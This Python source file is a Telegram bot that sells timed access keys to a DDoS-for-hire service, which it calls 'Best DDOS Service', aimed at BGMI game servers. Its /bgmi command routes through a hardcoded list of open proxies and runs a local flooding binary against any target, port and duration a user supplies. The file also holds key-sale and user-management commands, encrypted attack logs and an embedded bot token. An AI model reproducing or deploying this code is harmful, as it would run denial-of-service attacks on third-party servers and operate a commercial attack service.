import telebot
import subprocess
import datetime
import os
import random
import string
import json
import requests
from cryptography.fernet import Fernet
import threading

# Insert your Telegram bot token here
bot = telebot.TeleBot('6658426503:AAGXyi266msKeGxpbzo4VarIfA5JlqBZUDQ')

# Admin user IDs
admin_id = {"881808734"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# Cooldown settings
COOLDOWN_TIME = 0  # in seconds
CONSECUTIVE_ATTACKS_LIMIT = 2
CONSECUTIVE_ATTACKS_COOLDOWN = 240  # in seconds

# In-memory storage
users = {}
keys = {}
bgmi_cooldown = {}
consecutive_attacks = {}

# Encryption setup
KEY_FILE_PATH = "secret.key"

def load_or_generate_key():
    if os.path.exists(KEY_FILE_PATH):
        with open(KEY_FILE_PATH, "rb") as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE_PATH, "wb") as key_file:
            key_file.write(key)
        return key

encryption_key = load_or_generate_key()
cipher_suite = Fernet(encryption_key)

def encrypt_data(data):
    return cipher_suite.encrypt(data.encode())

def decrypt_data(data):
    return cipher_suite.decrypt(data).decode()

# Load users and keys from files initially
def load_data():
    global users, keys
    users = load_users_encrypted()
    keys = load_keys_encrypted()

def load_users_encrypted():
    try:
        with open(USER_FILE, "rb") as file:
            encrypted_data = file.read()
            if encrypted_data:
                return json.loads(decrypt_data(encrypted_data))
            else:
                return {}
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users_encrypted():
    with open(USER_FILE, "wb") as file:
        file.write(encrypt_data(json.dumps(users)))

def load_keys_encrypted():
    try:
        with open(KEY_FILE, "rb") as file:
            encrypted_data = file.read()
            if encrypted_data:
                return json.loads(decrypt_data(encrypted_data))
            else:
                return {}
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys_encrypted():
    with open(KEY_FILE, "wb") as file:
        file.write(encrypt_data(json.dumps(keys)))

def save_logs_encrypted(log_entry):
    with open(LOG_FILE, "ab") as file:
        file.write(encrypt_data(log_entry) + b'\n')

def load_logs_encrypted():
    try:
        with open(LOG_FILE, "rb") as file:
            encrypted_logs = file.readlines()
        return [decrypt_data(log) for log in encrypted_logs]
    except FileNotFoundError:
        return []
    except Exception as e:
        print(f"Error loading logs: {e}")
        return []

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    log_entry = f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n"
    save_logs_encrypted(log_entry)

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                return "🗑️Logs cleared successfully ✅"
    except FileNotFoundError:
        return "No logs found to clear."

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    save_logs_encrypted(log_entry)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# Mock refresh_proxies function
def refresh_proxies():
    global proxies_list
    # Mocked new proxies list
    proxies_list = ["177.234.241.25:999",
"35.185.196.38:3128",
"20.235.159.154:80",
"178.48.68.61:18080",
"18.169.83.87:1080",
"34.140.150.176:3128",
"161.34.40.35:3128",
"161.34.40.109:3128",
"164.163.42.5:10000",
"18.135.211.182:3128",
"35.161.172.205:3128",
"161.34.40.115:3128",
"54.212.22.168:1080",
"85.209.153.175:4153",
"85.209.153.174:4145",
"85.209.153.174:8080",
"101.43.125.68:3333",
"89.30.96.166:3128",

    ]
    print("Proxies refreshed")

def schedule_proxy_refresh(interval=3600):
    threading.Timer(interval, schedule_proxy_refresh, [interval]).start()
    refresh_proxies()

# Start the proxy refresh scheduler
schedule_proxy_refresh()

def get_working_proxy():
    random.shuffle(proxies_list)  # Shuffle to try random proxies
    for proxy in proxies_list:
        print(f"Checking proxy: {proxy}")  # Debug print
        ip, port = proxy.split(':')
        if check_proxy(ip, port):
            print(f"Working proxy found: {proxy}")  # Debug print
            return {"ip": ip, "port": port}
    print("No working proxy found")  # Debug print
    return None

def check_proxy(ip, port):
    try:
        response = requests.get("https://httpbin.org/ip", proxies={"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}, timeout=5)
        return response.status_code == 200
    except requests.RequestException as e:
        print(f"Proxy {ip}:{port} failed: {e}")  # Debug print
        return False

@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            try:
                time_amount = int(command[1])
                time_unit = command[2].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys_encrypted()
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number and unit of time (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "🫅ONLY OWNER CAN USE🫅"

    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        key = command[1]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users_encrypted()
            del keys[key]
            save_keys_encrypted()
            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]}"
        else:
            response = "Invalid or expired key."
    else:
        response = "Usage: /redeem <key>"

    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = "No data found"
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❌ Access Chala Gaya Dost. Naya Key Redeem Karle-> using /redeem <key> ❌"
            bot.reply_to(message, response)
            return
        
        if user_id not in admin_id:
            if user_id in bgmi_cooldown:
                time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                if time_since_last_attack < COOLDOWN_TIME:
                    cooldown_remaining = COOLDOWN_TIME - time_since_last_attack
                    response = f"Wait Karle Bhai {cooldown_remaining} seconds Baad  /bgmi Use Kariyo."
                    bot.reply_to(message, response)
                    return
                
                if consecutive_attacks.get(user_id, 0) >= CONSECUTIVE_ATTACKS_LIMIT:
                    if time_since_last_attack < CONSECUTIVE_ATTACKS_COOLDOWN:
                        cooldown_remaining = CONSECUTIVE_ATTACKS_COOLDOWN - time_since_last_attack
                        response = f"Wait Karle Bhai {cooldown_remaining} seconds baad /bgmi command use karna."
                        bot.reply_to(message, response)
                        return
                    else:
                        consecutive_attacks[user_id] = 0

            bgmi_cooldown[user_id] = datetime.datetime.now()
            consecutive_attacks[user_id] = consecutive_attacks.get(user_id, 0) + 1

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                time = int(command[3])
                if time > 190:
                    response = "⚠️Error: Time interval must be less than 190 seconds."
                else:
                    record_command_logs(user_id, '/bgmi', target, port, time)
                    log_command(user_id, target, port, time)
                    
                    # Get a working proxy
                    proxy = get_working_proxy()
                    if proxy is None:
                        response = "No working proxy found"
                    else:
                        proxy_command = f"http_proxy=http://{proxy['ip']}:{proxy['port']} https_proxy=http://{proxy['ip']}:{proxy['port']} "
                        full_command = proxy_command + f"./bgmi {target} {port} {time} 360"
                        # Send a notification that the attack is starting
                        bot.send_message(user_id, "🔥🔥Attack started...🔥🔥")
                        subprocess.run(full_command, shell=True)
                        response = f"BGMI FUCKED\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\n✅Attack sent successfully✅"
            except ValueError:
                response = "Error: Port and time must be integers."
        else:
            response = "✅Usage: /bgmi <target> <port> <time>"
    else:
        response = "🚫You are not authorized to use this command🚫"

    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻Welcome Premium Bot, {user_name}! Best DDOS Service.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message to all users by Admin:\n\n" + command[1]
            for user_id in users:
                try:
                    bot.send_message(user_id, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users 👍."
        else:
            response = "🤖 Please provide a message to broadcast."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in users:
                del users[target_user_id]
                save_users_encrypted()
                response = f"User {target_user_id} removed successfully."
            else:
                response = "User not found."
        else:
            response = "Usage: /remove <user_id>"
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

# The rest of the bot commands remain the same

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
